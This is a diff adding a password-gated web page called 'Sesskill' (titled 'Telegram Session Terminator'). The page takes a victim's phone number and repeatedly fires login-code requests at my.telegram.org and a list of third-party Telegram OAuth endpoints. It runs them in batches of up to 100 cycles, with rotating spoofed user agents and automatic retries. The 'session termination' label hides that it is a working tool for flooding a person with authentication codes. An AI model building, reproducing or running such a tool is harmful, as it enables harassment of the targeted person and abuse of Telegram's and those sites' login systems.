@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Session Terminator</title>
+    <style>
+        :root {
+            --primary: #0088cc;
+            --secondary: #0e1621;
+            --accent: #2b5278;
+            --text: #e1e1e1;
+            --error: #e53935;
+            --success: #43a047;
+            --background: #17212b;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: var(--background);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background-color: var(--secondary);
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            margin-top: 20px;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            color: var(--primary);
+            margin-bottom: 10px;
+            font-size: 2.5rem;
+        }
+        
+        .logo {
+            font-family: monospace;
+            color: var(--primary);
+            margin-bottom: 20px;
+            line-height: 1.4;
+            font-size: 1.2rem;
+        }
+        
+        .password-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .password-input {
+            padding: 12px 15px;
+            border-radius: 5px;
+            border: 1px solid var(--accent);
+            background-color: rgba(0, 0, 0, 0.2);
+            color: var(--text);
+            font-size: 1rem;
+            width: 100%;
+            max-width: 300px;
+        }
+        
+        .btn {
+            padding: 12px 25px;
+            border-radius: 5px;
+            border: none;
+            background-color: var(--primary);
+            color: white;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+        
+        .btn:hover {
+            background-color: #0077b3;
+            transform: translateY(-2px);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn-danger {
+            background-color: var(--error);
+        }
+        
+        .btn-danger:hover {
+            background-color: #c62828;
+        }
+        
+        .main-content {
+            display: none;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        
+        input[type="text"],
+        input[type="number"] {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 5px;
+            border: 1px solid var(--accent);
+            background-color: rgba(0, 0, 0, 0.2);
+            color: var(--text);
+            font-size: 1rem;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            display: none;
+        }
+        
+        .status.success {
+            background-color: rgba(67, 160, 71, 0.2);
+            border: 1px solid var(--success);
+            color: var(--success);
+            display: block;
+        }
+        
+        .status.error {
+            background-color: rgba(229, 57, 53, 0.2);
+            border: 1px solid var(--error);
+            color: var(--error);
+            display: block;
+        }
+        
+        .status.info {
+            background-color: rgba(0, 136, 204, 0.2);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            display: block;
+        }
+        
+        .log-container {
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+        
+        .log-entry {
+            margin-bottom: 5px;
+            padding-bottom: 5px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .log-time {
+            color: #aaa;
+            margin-right: 10px;
+        }
+        
+        .log-success {
+            color: var(--success);
+        }
+        
+        .log-error {
+            color: var(--error);
+        }
+        
+        .progress-container {
+            width: 100%;
+            background-color: rgba(0, 0, 0, 0.2);
+            border-radius: 5px;
+            margin-top: 20px;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 20px;
+            background-color: var(--primary);
+            width: 0%;
+            transition: width 0.3s ease;
+            text-align: center;
+            line-height: 20px;
+            font-size: 0.8rem;
+        }
+        
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            padding: 10px;
+            background-color: rgba(0, 0, 0, 0.2);
+            border-radius: 5px;
+        }
+        
+        .stat-item {
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="snos-text" style="font-family: 'Courier New', monospace; font-size: 48px; font-weight: bold; color: #ff0000; text-shadow: 0 0 10px #ff0000; text-align: center; letter-spacing: 2px;">
+  Sesskill
+</div>
+        
+        <div class="password-screen" id="passwordScreen">
+            <h2>Enter Access Password</h2>
+            <input type="password" class="password-input" id="passwordInput" placeholder="Enter password">
+            <button class="btn" id="loginBtn">Access Tool</button>
+            <div class="status error" id="passwordError" style="display: none;">Incorrect password!</div>
+        </div>
+        
+        <div class="main-content" id="mainContent">
+            <div class="form-group">
+                <label for="phoneNumber">Phone Number (with country code):</label>
+                <input type="text" id="phoneNumber" placeholder="+1234567890">
+            </div>
+            
+            <div class="form-group">
+                <label for="cycles">Number of Cycles:</label>
+                <input type="number" id="cycles" value="1" min="1" max="100">
+            </div>
+            
+            <button class="btn btn-danger" id="startSessionTermination">Start Session Termination</button>
+            <button class="btn" id="stopSessionTermination" style="display: none;">Stop</button>
+            
+            <div class="progress-container" id="sessionProgressContainer">
+                <div class="progress-bar" id="sessionProgressBar">0%</div>
+            </div>
+            
+            <div class="stats" id="statsContainer" style="display: none;">
+                <div class="stat-item">
+                    <div class="stat-label">Success:</div>
+                    <div class="stat-value" id="successCount">0</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">Failed:</div>
+                    <div class="stat-value" id="failedCount">0</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-label">Completed:</div>
+                    <div class="stat-value" id="completedCount">0%</div>
+                </div>
+            </div>
+            
+            <div class="status info" id="sessionStatus"></div>
+            <div class="log-container" id="sessionLog"></div>
+        </div>
+    </div>
+
+    <script>
+        const PASSWORD = "AmirDrishh";
+        const passwordScreen = document.getElementById('passwordScreen');
+        const mainContent = document.getElementById('mainContent');
+        const passwordInput = document.getElementById('passwordInput');
+        const loginBtn = document.getElementById('loginBtn');
+        const passwordError = document.getElementById('passwordError');
+        
+        loginBtn.addEventListener('click', () => {
+            if (passwordInput.value === PASSWORD) {
+                passwordScreen.style.display = 'none';
+                mainContent.style.display = 'block';
+            } else {
+                passwordError.style.display = 'block';
+                passwordInput.value = '';
+            }
+        });
+        
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                loginBtn.click();
+            }
+        });
+        
+        const phoneNumber = document.getElementById('phoneNumber');
+        const cycles = document.getElementById('cycles');
+        const startSessionBtn = document.getElementById('startSessionTermination');
+        const stopSessionBtn = document.getElementById('stopSessionTermination');
+        const sessionStatus = document.getElementById('sessionStatus');
+        const sessionLog = document.getElementById('sessionLog');
+        const sessionProgressContainer = document.getElementById('sessionProgressContainer');
+        const sessionProgressBar = document.getElementById('sessionProgressBar');
+        const statsContainer = document.getElementById('statsContainer');
+        const successCount = document.getElementById('successCount');
+        const failedCount = document.getElementById('failedCount');
+        const completedCount = document.getElementById('completedCount');
+        
+        let sessionTerminationActive = false;
+        let currentSessionCycle = 0;
+        let totalSessionCycles = 0;
+        let successRequests = 0;
+        let failedRequests = 0;
+        let totalRequests = 0;
+        let processedRequests = 0;
+        
+        const SESSION_URLS = [
+            'https://my.telegram.org/auth/send_password',
+            'https://my.telegram.org/auth/send_password',
+            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
+            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
+            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
+            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
+            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
+            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
+            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
+            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
+            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
+            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
+            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
+            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
+            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin'
+        ];
+        
+        function getRandomUserAgent() {
+            const agents = [
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
+                'Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
+            ];
+            return agents[Math.floor(Math.random() * agents.length)];
+        }
+        
+        function addSessionLog(message, isSuccess = true) {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            
+            if (isSuccess) {
+                logEntry.innerHTML = `<span class="log-time">[${timeString}]</span> <span class="log-success">✓</span> ${message}`;
+            } else {
+                logEntry.innerHTML = `<span class="log-time">[${timeString}]</span> <span class="log-error">✗</span> ${message}`;
+            }
+            
+            sessionLog.appendChild(logEntry);
+            sessionLog.scrollTop = sessionLog.scrollHeight;
+        }
+        
+        async function makeRequest(url, phone, cycle, attempt = 1) {
+            try {
+                const headers = {
+                    'User-Agent': getRandomUserAgent(),
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                };
+                
+                const body = `phone=${encodeURIComponent(phone)}`;
+                
+                const startTime = Date.now();
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: headers,
+                    body: body
+                });
+                
+                const responseTime = Date.now() - startTime;
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const data = await response.text();
+                
+                if (data.includes('error') || data.includes('flood') || data.includes('wait')) {
+                    throw new Error('Server returned error response');
+                }
+                
+                return { 
+                    success: true, 
+                    data,
+                    responseTime 
+                };
+            } catch (error) {
+                if (attempt < 3) {
+                    await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
+                    return makeRequest(url, phone, cycle, attempt + 1);
+                }
+                return { 
+                    success: false, 
+                    error: error.message 
+                };
+            }
+        }
+        
+        async function processSessionCycle(phone, cycle) {
+            addSessionLog(`Starting cycle ${cycle + 1} of ${totalSessionCycles}`);
+            
+            const concurrencyLimit = 5;
+            const batches = Math.ceil(SESSION_URLS.length / concurrencyLimit);
+            
+            for (let i = 0; i < batches; i++) {
+                if (!sessionTerminationActive) break;
+                
+                const batchStart = i * concurrencyLimit;
+                const batchEnd = Math.min(batchStart + concurrencyLimit, SESSION_URLS.length);
+                const batchUrls = SESSION_URLS.slice(batchStart, batchEnd);
+                
+                const batchPromises = batchUrls.map(url => 
+                    processSingleRequest(url, phone, cycle, batchStart + batchUrls.indexOf(url))
+                );
+                
+                await Promise.all(batchPromises);
+                
+                processedRequests += batchUrls.length;
+                const progress = Math.round((processedRequests / totalRequests) * 100);
+                sessionProgressBar.style.width = `${progress}%`;
+                sessionProgressBar.textContent = `${progress}%`;
+                completedCount.textContent = `${progress}%`;
+                
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+            
+            currentSessionCycle++;
+            
+            if (currentSessionCycle < totalSessionCycles && sessionTerminationActive) {
+                await processSessionCycle(phone, currentSessionCycle);
+            } else if (currentSessionCycle >= totalSessionCycles) {
+                sessionTerminationComplete();
+            }
+        }
+        
+        async function processSingleRequest(url, phone, cycle, index) {
+            if (!sessionTerminationActive) return;
+            
+            const urlDisplay = url.split('/')[2];
+            addSessionLog(`Sending to: ${urlDisplay}`);
+            
+            const result = await makeRequest(url, phone, cycle);
+            
+            if (result.success) {
+                successRequests++;
+                successCount.textContent = successRequests;
+                addSessionLog(`Success: Code sent via ${urlDisplay} (${result.responseTime}ms)`);
+            } else {
+                failedRequests++;
+                failedCount.textContent = failedRequests;
+                addSessionLog(`Failed: ${urlDisplay} - ${result.error}`, false);
+            }
+        }
+        
+        function sessionTerminationComplete() {
+            sessionTerminationActive = false;
+            startSessionBtn.style.display = 'block';
+            stopSessionBtn.style.display = 'none';
+            
+            const successRate = totalRequests > 0 ? Math.round((successRequests / totalRequests) * 100) : 0;
+            sessionStatus.textContent = `Completed! Success: ${successRequests}, Failed: ${failedRequests} (${successRate}% success rate)`;
+            sessionStatus.className = 'status success';
+            sessionStatus.style.display = 'block';
+            
+            addSessionLog(`Process completed. Total: ${totalRequests}, Success: ${successRequests}, Failed: ${failedRequests}`);
+        }
+        
+        startSessionBtn.addEventListener('click', async () => {
+            const phone = phoneNumber.value.trim();
+            const cycleCount = parseInt(cycles.value);
+            
+            if (!phone) {
+                sessionStatus.textContent = 'Please enter a phone number';
+                sessionStatus.className = 'status error';
+                sessionStatus.style.display = 'block';
+                return;
+            }
+            
+            if (isNaN(cycleCount) || cycleCount < 1 || cycleCount > 100) {
+                sessionStatus.textContent = 'Please enter a valid number of cycles (1-100)';
+                sessionStatus.className = 'status error';
+                sessionStatus.style.display = 'block';
+                return;
+            }
+            
+            sessionTerminationActive = true;
+            currentSessionCycle = 0;
+            totalSessionCycles = cycleCount;
+            successRequests = 0;
+            failedRequests = 0;
+            totalRequests = cycleCount * SESSION_URLS.length;
+            processedRequests = 0;
+            
+            startSessionBtn.style.display = 'none';
+            stopSessionBtn.style.display = 'block';
+            sessionProgressContainer.style.display = 'block';
+            statsContainer.style.display = 'flex';
+            sessionProgressBar.style.width = '0%';
+            sessionProgressBar.textContent = '0%';
+            successCount.textContent = '0';
+            failedCount.textContent = '0';
+            completedCount.textContent = '0%';
+            
+            sessionStatus.textContent = 'Starting session termination...';
+            sessionStatus.className = 'status info';
+            sessionStatus.style.display = 'block';
+            
+            sessionLog.innerHTML = '';
+            addSessionLog(`Starting process for: ${phone}`);
+            addSessionLog(`Total requests to send: ${totalRequests}`);
+            
+            await processSessionCycle(phone, currentSessionCycle);
+        });
+        
+        stopSessionBtn.addEventListener('click', () => {
+            sessionTerminationActive = false;
+            startSessionBtn.style.display = 'block';
+            stopSessionBtn.style.display = 'none';
+            
+            const totalAttempts = successRequests + failedRequests;
+            const successRate = totalAttempts > 0 ? Math.round((successRequests / totalAttempts) * 100) : 0;
+            
+            sessionStatus.textContent = `Stopped. Success: ${successRequests}, Failed: ${failedRequests} (${successRate}% success rate)`;
+            sessionStatus.className = 'status error';
+            sessionStatus.style.display = 'block';
+            
+            addSessionLog(`Process stopped by user. Attempted ${totalAttempts} of ${totalRequests} requests`);
+        });
+    </script>
+</body>
+</html>
